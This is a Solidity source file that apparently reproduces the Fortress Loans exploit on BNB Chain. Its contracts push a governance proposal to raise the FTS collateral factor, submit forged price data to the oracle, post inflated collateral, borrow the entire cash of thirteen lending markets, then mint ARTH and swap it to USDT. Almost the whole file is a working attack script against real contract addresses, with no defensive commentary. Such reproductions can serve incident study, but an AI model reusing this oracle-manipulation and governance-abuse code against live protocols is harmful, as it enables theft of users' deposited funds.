// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./console.sol";
import "./IGovernorAlpha.sol";
import "./IUnitroller.sol";
import "./IPriceFeed.sol";
import "./IBorrowerOperations.sol";

interface IFortressPriceOracle{
    function getUnderlyingPrice(FToken fToken) external view returns (uint);
}

interface FBep20Interface{
    function mint(uint mintAmount) external returns (uint);
    function borrow(uint borrowAmount) external returns (uint);
    function getCash() external view returns (uint);
}

interface IVyper{
    function exchange_underlying(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy,
        address receiver
) external returns (uint256);
}

interface FTokenInterface{
    function balanceOf(address owner) external view returns (uint);
    function balanceOfUnderlying(address owner) external returns (uint);
    function getAccountSnapshot(address account) external view returns (uint, uint, uint, uint);
    function borrowRatePerBlock() external view returns (uint);
    function supplyRatePerBlock() external view returns (uint);
    function totalBorrowsCurrent() external returns (uint);
    function borrowBalanceCurrent(address account) external returns (uint);
    function borrowBalanceStored(address account) external view returns (uint);
    function exchangeRateCurrent() external returns (uint);
    function exchangeRateStored() external view returns (uint);
    function getCash() external view returns (uint);
}


contract FTS_exploit{
    address public constant GovernorAlpha = 0xE79ecdB7fEDD413E697F083982BAC29e93d86b2E;             //execute(11)
    address public constant Chain = 0xc11B687cd6061A6516E23769E4657b6EfA25d78E;                     //submit
    address public constant FortressPriceOracle = 0x00fcF33BFa9e3fF791b2b819Ab2446861a318285;       //getUnderlyingPrice
    address public constant PriceFeed = 0xAa24b64C9B44D874368b09325c6D60165c4B39f2;                 //fetchPrice
    address public constant Unitroller = 0x67340Bd16ee5649A37015138B3393Eb5ad17c195;                //enterMarkets
    address public constant BorrowerOperations = 0xd55555376f9A43229Dc92abc856AA93Fee617a9A;        //openTrove

    address public constant FTS = 0x4437743ac02957068995c48E08465E0EE1769fBE;
    address public constant fFTS = 0x854C266b06445794FA543b1d8f6137c35924C9EB;

    address public constant FBNB = 0xE24146585E882B6b59ca9bFaaaFfED201E4E5491;                      //getCash, borrow 1224650634144094162737
    address public constant fUSDC = 0x3ef88D7FDe18Fe966474FE3878b802F678b029bC;                     //getCash, borrow 25362502469320042903093
    address public constant fUSDT = 0x554530ecDE5A4Ba780682F479BC9F64F4bBFf3a1;                     //getCash, borrow 40989346150386587693923
    address public constant fBUSD = 0x8BB0d002bAc7F1845cB2F14fe3D6Aae1D1601e29;                     //getCash, borrow 418909951167111994488637
    address public constant fBTC = 0x47BAA29244c342f1e6cDe11C968632E7403aE258;                      //getCash, borrow 22729139539924438159
    address public constant fETH = 0x5F3EF8B418a8cd7E3950123D980810A0A1865981;                      //getCash, borrow 161205796359835764716
    address public constant fLTC = 0xE75b16cc66F8820Fb97f52f0C25F41982ba4daF3;                      //getCash, borrow 584672766467400973125
    address public constant fXRP = 0xa7FB72808de4FFcaCf9a815Bd1CcbE70F03b54ca;                      //getCash, borrow 36106987338535091504008
    address public constant fADA = 0x4C0933453359733b4867DfF1145A9a0749931A00;                      //getCash, borrow 51898034974045581151666
    address public constant fDAI = 0x5F30fDDdCf14a0997a52fdb7D7F23b93F0f21998;                      //getCash, borrow 51692911822277425590393
    address public constant fDOT = 0x8fc4f7A57BB19E701108b17d785a28118604a3D1;                      //getCash, borrow 3085733193207204598081
    address public constant fBETH = 0x8ed1f4c1326E5d3C1b6E99Ac9E5EC6651E11e3Da;                      //getCash, borrow 3123556747684528478
    address public constant fSHIB = 0x073C0AC03e7C839C718A65E0C4D0724Cc0bd2B5f;                      //getCash, borrow 990248211251809065999207892


    address public constant MAHA = 0xCE86F7fcD3B40791F63B86C3ea3B8B355Ce2685b;                      //approve BorrowerOperations
    address public constant ARTH = 0xB69A424Df8C737a122D0e60695382B3Eec07fF4B;                      //approve ARTH_usd
    address public constant ARTH_usd = 0x88fd584dF3f97c64843CD474bDC6F78e398394f4;                  //deposit 1000000000000000000000000000

    address public constant Vyper_contract1 = 0x98245Bfbef4e3059535232D68821a58abB265C45;           //exchange_underlying
    // address public constant Vyper_contract2 = 0x1d4B4796853aEDA5Ab457644a18B703b6bA8b4aB;           //exchange_underlying   //wrong address, (ARTH_usd - val3EPS) pair

    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;


    function set_approve() public{
        IERC20(FTS).approve(fFTS, type(uint).max);

    }


    function Governor_execute() public{
        IGovernorAlpha.ProposalState _state;
        _state = IGovernorAlpha(GovernorAlpha).state(11);
        console.log("the proposal 11 state is: ", uint(_state));

        IGovernorAlpha(GovernorAlpha).execute(11);
        console.log("We have executed the Governor...");

        uint32 _dataTimestamp = 1652042082;
        bytes32 _root = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d886;
        bytes32[] memory _keys = new bytes32[](2);
        _keys[0] = 0x000000000000000000000000000000000000000000000000004654532d555344;
        _keys[1] = 0x0000000000000000000000000000000000000000000000004d4148412d555344;

        uint256[] memory _values = new uint256[](2);
        _values[0] = 40000000000000000000000000000000000;
        _values[1] = 40000000000000000000000000000000000;

        uint8[] memory _v = new uint8[](4);
        _v[0] = 28;
        _v[1] = 28;
        _v[2] = 28;
        _v[3] = 28;

        bytes32[] memory _r = new bytes32[](4);
        _r[0] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d885;
        _r[1] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d882;
        _r[2] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d877;
        _r[3] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d881;
        
        bytes32[] memory _s = new bytes32[](4);
        _s[0] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d825;
        _s[1] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d832;
        _s[2] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d110;
        _s[3] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d841;
        
        IChain(Chain).submit(_dataTimestamp, _root, _keys, _values, _v, _r, _s);
        console.log("We have change the Oracle...");

        FTS_PriceOracle();
    }


    function FTS_PriceOracle() public {

        uint returned = IFortressPriceOracle(FortressPriceOracle).getUnderlyingPrice(FToken(fFTS));
        console.log("fFTS token Price is: ", returned);

        uint256 fetched = IPriceFeed(PriceFeed).fetchPrice();
        console.log("feed price...", fetched);

        address[] memory fTokens = new address[](1);
        fTokens[0] = fFTS;
        IUnitroller(Unitroller).enterMarkets(fTokens);
        console.log("enter the markets...");

        fFTS_mint();

        IUnitroller(Unitroller).getAllMarkets();
        console.log("I have got all the markets prices...");
        begin_borrow();
    }

    function fFTS_mint() internal{
        IERC20(FTS).approve(fFTS, type(uint).max);
        FBep20Interface(fFTS).mint(100000000000);
        console.log("fFTS is minted...", FTokenInterface(fFTS).balanceOf(address(this)));
    }

    function begin_borrow() public {
        console.log("begin to borrow the pool...");
        //FBNB,
        uint FBNB_amount = FBep20Interface(FBNB).getCash();
        console.log("FBNB_amount...", FBNB_amount);
        FBep20Interface(FBNB).borrow(FBNB_amount);
        // uint FBNB_amount_after = FBep20Interface(FBNB).getCash();
        // console.log("FBNB_amount borrowed after...", FBNB_amount_after);
        // //fUSDC
        uint fUSDC_amount = FBep20Interface(fUSDC).getCash();
        console.log("fUSDC_amount...", fUSDC_amount);
        FBep20Interface(fUSDC).borrow(fUSDC_amount);
        // //fUSDT
        uint fUSDT_amount = FBep20Interface(fUSDT).getCash();
        console.log("fUSDT_amount...", fUSDT_amount);
        FBep20Interface(fUSDT).borrow(fUSDT_amount);
        // //fBUSD
        uint fBUSD_amount = FBep20Interface(fBUSD).getCash();
        console.log("fBUSD_amount...", fBUSD_amount);
        FBep20Interface(fBUSD).borrow(fBUSD_amount);
        // //fBTC
        uint fBTC_amount = FBep20Interface(fBTC).getCash();
        console.log("fBTC_amount...", fBTC_amount);
        FBep20Interface(fBTC).borrow(fBTC_amount);
        // //fETH
        uint fETH_amount = FBep20Interface(fETH).getCash();
        console.log("fETH_amount...", fETH_amount);
        FBep20Interface(fETH).borrow(fETH_amount);
        // //fLTC
        uint fLTC_amount = FBep20Interface(fLTC).getCash();
        console.log("fLTC_amount...", fLTC_amount);
        FBep20Interface(fLTC).borrow(fLTC_amount);
        //fXRP_amount
        uint fXRP_amount = FBep20Interface(fXRP).getCash();
        console.log("fXRP_amount...", fXRP_amount);
        FBep20Interface(fXRP).borrow(fXRP_amount);
        // //fADA_amount
        uint fADA_amount = FBep20Interface(fADA).getCash();
        console.log("fADA_amount...", fADA_amount);
        FBep20Interface(fADA).borrow(fADA_amount);
        // //fDAI
        uint fDAI_amount = FBep20Interface(fDAI).getCash();
        console.log("fDAI_amount...", fDAI_amount);
        FBep20Interface(fDAI).borrow(fDAI_amount);
        //fDOT
        uint fDOT_amount = FBep20Interface(fDOT).getCash();
        console.log("fDOT_amount...", fDOT_amount);
        FBep20Interface(fDOT).borrow(fDOT_amount);
        // //fBETH
        uint fBETH_amount = FBep20Interface(fBETH).getCash();
        console.log("fBETH_amount...", fBETH_amount);
        FBep20Interface(fBETH).borrow(fBETH_amount);
        // //fSHIB
        uint fSHIB_amount = FBep20Interface(fSHIB).getCash();
        console.log("fSHIB_amount...", fSHIB_amount);
        FBep20Interface(fSHIB).borrow(fSHIB_amount);

        console.log("we have borrowed all the money...");
        // check_the_borrowed_token();
        Borrow_Operations();
    }

    function check_the_borrowed_token() internal view {
        console.log("check borrowed money...");
        console.log("FBNB balance...",FTokenInterface(FBNB).borrowBalanceStored(address(this)));
        console.log("fUSDC balance...",FTokenInterface(fUSDC).borrowBalanceStored(address(this)));
        console.log("fUSDT balance...",FTokenInterface(fUSDT).borrowBalanceStored(address(this)));
        console.log("fBUSD balance...",FTokenInterface(fBUSD).borrowBalanceStored(address(this)));
        console.log("fBTC balance...",FTokenInterface(fBTC).borrowBalanceStored(address(this)));
        console.log("fETH balance...",FTokenInterface(fETH).borrowBalanceStored(address(this)));
        console.log("fLTC balance...",FTokenInterface(fLTC).borrowBalanceStored(address(this)));
        console.log("fXRP balance...",FTokenInterface(fXRP).borrowBalanceStored(address(this)));
        console.log("fADA balance...",FTokenInterface(fADA).borrowBalanceStored(address(this)));
        console.log("fDAI balance...",FTokenInterface(fDAI).borrowBalanceStored(address(this)));
        console.log("fDOT balance...",FTokenInterface(fDOT).borrowBalanceStored(address(this)));
        console.log("fBETH balance...",FTokenInterface(fBETH).borrowBalanceStored(address(this)));
        console.log("fSHIB balance...",FTokenInterface(fSHIB).borrowBalanceStored(address(this)));
    }

    function Borrow_Operations() internal {
        console.log("operations start...");
        IERC20(MAHA).approve(BorrowerOperations, type(uint).max);
        console.log("MAHA balance: ", IERC20(MAHA).balanceOf(address(this)));

        uint256 _maxFee = 1000000000000000000;
        uint256 _LUSDAmount = 1000000000000000000000000000;
        uint256 _ETHAmount = 3020309536199074866;
        address _upperHint = 0x0000000000000000000000000000000000000000;
        address _lowerHint = 0x0000000000000000000000000000000000000000;
        address _frontEndTag = 0x0000000000000000000000000000000000000000;
        IBorrowerOperations(BorrowerOperations).openTrove(_maxFee, _LUSDAmount, _ETHAmount, _upperHint, _lowerHint, _frontEndTag);

        console.log("Trove opened...");

        IERC20(ARTH).approve(ARTH_usd, type(uint).max);
        IARTH(ARTH_usd).deposit(1000000000000000000000000000);

        console.log("ARTH_usd balance: ", IERC20(ARTH_usd).balanceOf(address(this)));
        Vyper_exchange();
    }

    function Vyper_exchange() public {
        
        IARTH(ARTH_usd).approve(Vyper_contract1, type(uint).max);
        // IARTH(ARTH_usd).approve(Vyper_contract2, type(uint).max);

        console.log("exchange ARTH_usd for USDT...");

        IVyper(Vyper_contract1).exchange_underlying(0, 3, 500000000000000000000000000, 0, address(this));
        // IVyper(Vyper_contract2).exchange_underlying(0, 1, 15000000000000000000000000000, 0, address(this));

        console.log("Now I have USDT: ", IERC20(USDT).balanceOf(address(this)));
    }

    receive() external payable {}

}

contract FTS_propose{
    address public constant GovernorAlpha = 0xE79ecdB7fEDD413E697F083982BAC29e93d86b2E;


    function propose_a_proposal() public{
        console.log("start to propose...");

        address[] memory targets = new address[](1);
        targets[0] = 0x67340Bd16ee5649A37015138B3393Eb5ad17c195;

        uint[] memory values = new uint[](1);
        values[0] = 0;

        string[] memory signatures = new string[](1);
        signatures[0] = "_setCollateralFactor(address,uint256)";

        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = "0x000000000000000000000000854c266b06445794fa543b1d8f6137c35924c9eb00000000000000000000000000000000000000000000000009b6e64a8ec60000";

        string memory description = "I wanna kill you.";

        uint return_id = IGovernorAlpha(GovernorAlpha).propose(targets, values, signatures, calldatas, description);

        console.log("the proposal id is: ",return_id);
    }

    function vote_the_proposal() public {
        console.log("vote the proposal...");

        IGovernorAlpha(GovernorAlpha).castVote(10, true);
    }

    function queue_the_proposal() public {
        console.log("Put the proposal into queue...");

        IGovernorAlpha(GovernorAlpha).queue(10);
    }
    

}